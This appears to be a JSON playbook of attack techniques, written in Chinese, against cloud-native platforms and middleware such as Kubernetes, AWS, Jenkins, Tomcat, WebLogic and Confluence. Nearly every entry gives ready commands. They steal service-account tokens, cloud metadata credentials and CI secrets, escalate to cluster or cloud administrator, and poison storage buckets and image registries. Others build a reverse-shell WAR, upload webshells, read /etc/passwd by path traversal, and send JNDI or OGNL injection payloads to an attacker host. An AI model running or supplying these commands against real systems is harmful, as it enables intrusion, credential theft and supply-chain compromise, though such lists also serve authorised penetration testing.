[{"id":"cl-k8s-api-unauth","n":"K8s API 未授权","cat":"云原生","phase":"exploit","d":"匿名可读时列举命名空间与 Pod。","cmds":["kubectl --server=https://<ip>:6443 --insecure-skip-tls-verify get pods -A"],"tools":["kubectl"],"tags":["k8s"]},{"id":"cl-k8s-token","n":"ServiceAccount 令牌滥用","cat":"云原生","phase":"exploit","d":"用 Pod 内令牌横向到集群资源。","cmds":["curl -s -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)\" https://kubernetes.default.svc/api"],"tools":["curl"],"tags":["k8s"]},{"id":"cl-k8s-rbac","n":"RBAC 权限提升","cat":"云原生","phase":"exploit","d":"找可创建 RoleBinding 的权限自升。","cmds":["kubectl auth can-i --list","kubectl create clusterrolebinding pwn --clusterrole=cluster-admin --serviceaccount=default:default"],"tools":["kubectl"],"tags":["k8s"]},{"id":"cl-k8s-escape","n":"容器逃逸取证","cat":"云原生","phase":"exploit","d":"检查特权、挂载、capabilities 与内核面。","cmds":["capsh --print","ls /var/run/docker.sock /proc/1/root"],"tools":["cdk"],"tags":["escape"]},{"id":"cl-docker-api","n":"Docker API 未授权","cat":"云原生","phase":"exploit","d":"2375 暴露时直接起特权容器挂载宿主根。","cmds":["docker -H tcp://<ip>:2375 run -v /:/host -it alpine chroot /host"],"tools":["docker"],"tags":["docker"]},{"id":"cl-registry","n":"镜像仓库匿名拉取","cat":"云原生","phase":"exploit","d":"匿名列举 catalog 并提取镜像中的密钥。","cmds":["curl -s https://<registry>/v2/_catalog"],"tools":["curl"],"tags":["registry"]},{"id":"cl-argocd","n":"ArgoCD 接管","cat":"云原生","phase":"exploit","d":"默认口令或 SSO 绕过接管 GitOps 交付链。","cmds":["argocd login <host> --username admin --password <pass> --insecure"],"tools":["argocd"],"tags":["cicd"]},{"id":"cl-harbor","n":"Harbor 默认口令","cat":"云原生","phase":"exploit","d":"登录后推送后门镜像污染部署。","cmds":["curl -s -u admin:Harbor12345 https://<host>/api/v2.0/projects"],"tools":["curl"],"tags":["registry"]},{"id":"cl-jenkins","n":"Jenkins 凭据窃取","cat":"云原生","phase":"exploit","d":"脚本控制台读取 credentials.xml 与主密钥。","cmds":["curl -X POST https://<host>/scriptText -d 'script=println(new File(\"/var/jenkins_home/credentials.xml\").text)'"],"tools":["curl"],"tags":["cicd"]},{"id":"cl-gitlab-ci","n":"GitLab CI 变量外带","cat":"云原生","phase":"exploit","d":"改 .gitlab-ci.yml 打印受保护变量。","cmds":["echo 'job: {script: env}' > .gitlab-ci.yml"],"tools":["git"],"tags":["cicd"]},{"id":"cl-github-action","n":"Actions 供应链投毒","cat":"云原生","phase":"exploit","d":"通过 PR 触发工作流读取 Secrets。","cmds":["git clone <repo> && echo 'run: env' >> .github/workflows/x.yml"],"tools":["git"],"tags":["cicd"]},{"id":"cl-terraform-state","n":"Terraform State 泄露","cat":"云原生","phase":"exploit","d":"从 state 提取云凭据与资源口令。","cmds":["curl -s https://<bucket>/terraform.tfstate | jq '.resources[].instances[].attributes'"],"tools":["curl","jq"],"tags":["iac"]},{"id":"cl-aws-imds","n":"AWS 元数据取凭据","cat":"云原生","phase":"exploit","d":"从 IMDS 获取临时密钥接管账号。","cmds":["curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"],"tools":["curl"],"tags":["aws"]},{"id":"cl-aws-iam-privesc","n":"AWS IAM 提权","cat":"云原生","phase":"exploit","d":"用 PassRole 与 Lambda 组合升到管理员。","cmds":["aws iam list-attached-user-policies --user-name <u>","aws lambda create-function --role <admin-arn> ..."],"tools":["awscli"],"tags":["aws"]},{"id":"cl-aws-s3","n":"S3 桶误配利用","cat":"云原生","phase":"exploit","d":"公共写桶投毒前端资源。","cmds":["aws s3 cp shell.js s3://<bucket>/app.js --no-sign-request"],"tools":["awscli"],"tags":["aws","storage"]},{"id":"cl-azure-sp","n":"Azure SPN 权限滥用","cat":"云原生","phase":"exploit","d":"用泄露的 SPN 密钥枚举订阅与资源。","cmds":["az login --service-principal -u <appid> -p <secret> --tenant <tid>"],"tools":["az"],"tags":["azure"]},{"id":"cl-gcp-sa","n":"GCP SA 密钥利用","cat":"云原生","phase":"exploit","d":"用服务账号密钥遍历项目与存储桶。","cmds":["gcloud auth activate-service-account --key-file key.json"],"tools":["gcloud"],"tags":["gcp"]},{"id":"cl-aliyun-ram","n":"阿里云 RAM 提权","cat":"云原生","phase":"exploit","d":"用 AK 枚举并挂载管理员策略。","cmds":["aliyun ram ListUsers","aliyun ram AttachPolicyToUser --PolicyName AdministratorAccess --UserName <u>"],"tools":["aliyuncli"],"tags":["aliyun"]},{"id":"cl-cos-bucket","n":"对象存储桶接管","cat":"云原生","phase":"exploit","d":"遍历公开桶并上传恶意文件。","cmds":["coscli ls cos://<bucket> -r"],"tools":["coscli"],"tags":["storage"]},{"id":"cl-cloud-func","n":"云函数注入","cat":"云原生","phase":"exploit","d":"改函数代码或环境变量窃取密钥。","cmds":["aws lambda update-function-code --function-name <f> --zip-file fileb://x.zip"],"tools":["awscli"],"tags":["serverless"]},{"id":"cl-vcenter","n":"vCenter 接管","cat":"云原生","phase":"exploit","d":"利用未授权或弱口令控制虚拟化平台。","cmds":["curl -sk https://<ip>/rest/com/vmware/cis/session -X POST -u administrator@vsphere.local:<pass>"],"tools":["curl"],"tags":["vmware"]},{"id":"cl-esxi","n":"ESXi 面攻击","cat":"云原生","phase":"exploit","d":"SOAP 接口弱口令或 OpenSLP 漏洞。","cmds":["nmap -Pn -p 443,902 --script vmware-version <ip>"],"tools":["nmap"],"tags":["vmware"]},{"id":"cl-nacos","n":"Nacos 未授权","cat":"云原生","phase":"exploit","d":"默认 token 绕过获取配置与用户列表。","cmds":["curl -s 'http://<ip>:8848/nacos/v1/auth/users?pageNo=1&pageSize=10&accessToken=<t>'"],"tools":["curl"],"tags":["config"]},{"id":"cl-consul-acl","n":"Consul ACL 缺失","cat":"云原生","phase":"exploit","d":"注册恶意服务或读取全量 KV。","cmds":["curl -s -X PUT http://<ip>:8500/v1/agent/service/register -d '{\"Name\":\"x\",\"Check\":{\"Script\":\"id\"}}'"],"tools":["curl"],"tags":["config"]},{"id":"mw-tomcat-manager","n":"Tomcat 管理台部署","cat":"中间件","phase":"exploit","d":"弱口令登录 manager 部署 WAR 拿 shell。","cmds":["msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip> LPORT=4444 -f war -o x.war","curl -u tomcat:tomcat -T x.war 'http://<host>/manager/text/deploy?path=/x'"],"tools":["msfvenom","curl"],"tags":["tomcat"]},{"id":"mw-tomcat-ajp","n":"Tomcat AJP 文件包含","cat":"中间件","phase":"exploit","d":"用 Ghostcat 读取或包含任意文件。","cmds":["python3 ajpShooter.py http://<host>/ 8009 /WEB-INF/web.xml read"],"tools":["ajpshooter"],"tags":["tomcat","cve"]},{"id":"mw-weblogic-t3","n":"WebLogic T3 反序列化","cat":"中间件","phase":"exploit","d":"用 T3 协议投递 gadget 链执行命令。","cmds":["python3 weblogic.py -t <ip> -p 7001 --exploit"],"tools":["weblogic-exp"],"tags":["weblogic"]},{"id":"mw-weblogic-console","n":"WebLogic 控制台未授权","cat":"中间件","phase":"exploit","d":"CVE-2020-14882 绕过认证进控制台部署。","cmds":["curl -s 'http://<host>:7001/console/css/%252e%252e%252fconsole.portal'"],"tools":["curl"],"tags":["weblogic","cve"]},{"id":"mw-jboss","n":"JBoss 反序列化与控制台","cat":"中间件","phase":"exploit","d":"JMX 控制台部署 WAR 或利用反序列化。","cmds":["curl -s http://<host>:8080/jmx-console/"],"tools":["curl"],"tags":["jboss"]},{"id":"mw-websphere","n":"WebSphere 管理面攻击","cat":"中间件","phase":"exploit","d":"默认控制台口令或 IIOP 反序列化。","cmds":["curl -sk https://<ip>:9043/ibm/console/"],"tools":["curl"],"tags":["websphere"]},{"id":"mw-spring-actuator","n":"Actuator 敏感端点利用","cat":"中间件","phase":"exploit","d":"env 改属性触发配置注入或读 heapdump。","cmds":["curl -s 'https://<host>/actuator/env'","curl -s -X POST 'https://<host>/actuator/env' -d '{\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://<collab>/x\"}'"],"tools":["curl"],"tags":["spring"]},{"id":"mw-gateway-rce","n":"Spring Cloud Gateway RCE","cat":"中间件","phase":"exploit","d":"CVE-2022-22947 注入 SpEL 执行命令。","cmds":["python3 spring-gateway-rce.py -u https://<host>"],"tools":["python"],"tags":["spring","cve"]},{"id":"mw-nacos-derby","n":"Nacos Derby 注入","cat":"中间件","phase":"exploit","d":"默认 token 触发 Derby SQL 执行。","cmds":["python3 nacos-exploit.py -t http://<ip>:8848"],"tools":["python"],"tags":["nacos"]},{"id":"mw-fastjson-chain","n":"Fastjson 版本链利用","cat":"中间件","phase":"exploit","d":"按版本选择 JNDI/BECL/TemplatesImpl。","cmds":["java -jar JNDIExploit.jar -i <ip>","curl -X POST https://<host>/api -d '{\"@type\":\"com.zaxxer.hikari.HikariConfig\"...}'"],"tools":["java"],"tags":["java"]},{"id":"mw-jackson","n":"Jackson 多态反序列化","cat":"中间件","phase":"exploit","d":"开启 defaultTyping 时投递 gadget。","cmds":["curl -X POST https://<host>/api -d '[\"com.sun.rowset.JdbcRowSetImpl\",{\"dataSourceName\":\"ldap://<collab>/x\"}]'"],"tools":["curl"],"tags":["java"]},{"id":"mw-shiro-key","n":"Shiro 默认密钥爆破","cat":"中间件","phase":"exploit","d":"收集密钥字典并投递 rememberMe 载荷。","cmds":["python3 shiro_exploit.py -u https://<host>/"],"tools":["shiro-exploit"],"tags":["java"]},{"id":"mw-tomcat-put","n":"Tomcat PUT 写文件","cat":"中间件","phase":"exploit","d":"CVE-2017-12615 上传 JSP webshell。","cmds":["curl -X PUT 'https://<host>/x.jsp/' --data-binary @shell.jsp"],"tools":["curl"],"tags":["tomcat","cve"]},{"id":"mw-httpd-traversal","n":"Apache 路径穿越","cat":"中间件","phase":"exploit","d":"CVE-2021-41773 读取或执行任意文件。","cmds":["curl -s 'https://<host>/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'"],"tools":["curl"],"tags":["apache","cve"]},{"id":"mw-nginx-alias","n":"Nginx 配置错误穿越","cat":"中间件","phase":"exploit","d":"alias 未闭合时穿越到上层目录读文件。","cmds":["curl -s 'https://<host>/static../etc/passwd'"],"tools":["curl"],"tags":["nginx"]},{"id":"mw-iis-shortname","n":"IIS 短文件名枚举","cat":"中间件","phase":"exploit","d":"用 ~1 语法枚举隐藏文件与备份。","cmds":["python3 iis_shortname_scan.py https://<host>/"],"tools":["python"],"tags":["iis"]},{"id":"mw-iis-webshell","n":"IIS 解析与上传","cat":"中间件","phase":"exploit","d":"利用 .asp;.jpg 解析或 PUT 写马。","cmds":["curl -X PUT https://<host>/x.txt --data-binary @shell.asp"],"tools":["curl"],"tags":["iis"]},{"id":"mw-confluence","n":"Confluence 未授权链","cat":"中间件","phase":"exploit","d":"OGNL 注入或模板注入接管实例。","cmds":["curl -s 'https://<host>/%24%7B%40java.lang.Runtime%40getRuntime().exec(%22id%22)%7D/'"],"tools":["curl"],"tags":["confluence"]},{"id":"mw-solr","n":"Solr 配置注入 RCE","cat":"中间件","phase":"exploit","d":"用 Velocity 模板远程加载执行。","cmds":["curl -s 'http://<ip>:8983/solr/admin/cores?wt=json'"],"tools":["curl"],"tags":["solr"]},{"id":"mw-activemq","n":"ActiveMQ 反序列化","cat":"中间件","phase":"exploit","d":"CVE-2023-46604 通过 OpenWire 执行。","cmds":["python3 activemq-rce.py -u <ip>:61616 -c 'id'"],"tools":["python"],"tags":["mq"]},{"id":"mw-zabbix","n":"Zabbix 面攻击","cat":"中间件","phase":"exploit","d":"默认口令或 SQL 注入获取管理员。","cmds":["curl -s -X POST https://<host>/index.php -d 'name=Admin&password=zabbix&enter=Sign in'"],"tools":["curl"],"tags":["monitor"]},{"id":"mw-grafana","n":"Grafana 插件与弱口令","cat":"中间件","phase":"exploit","d":"默认 admin 或插件路径穿越读取配置。","cmds":["curl -s 'http://<ip>:3000/public/plugins/alertlist/../../../../etc/passwd'"],"tools":["curl"],"tags":["monitor"]},{"id":"mw-kibana","n":"Kibana 未授权与原型链","cat":"中间件","phase":"exploit","d":"访问受保护 API 或利用原型污染。","cmds":["curl -s 'http://<ip>:5601/api/status'"],"tools":["curl"],"tags":["monitor"]},{"id":"mw-minio","n":"MinIO 未授权与控制台","cat":"中间件","phase":"exploit","d":"默认密钥或控制台弱口令接管存储。","cmds":["mc alias set m http://<ip>:9000 minioadmin minioadmin"],"tools":["mc"],"tags":["storage"]},{"id":"mw-jumpserver","n":"堡垒机面攻击","cat":"中间件","phase":"exploit","d":"默认口令或已知漏洞获取资产凭据。","cmds":["curl -s https://<host>/api/v1/authentication/auth/"],"tools":["curl"],"tags":["jumpserver"]}]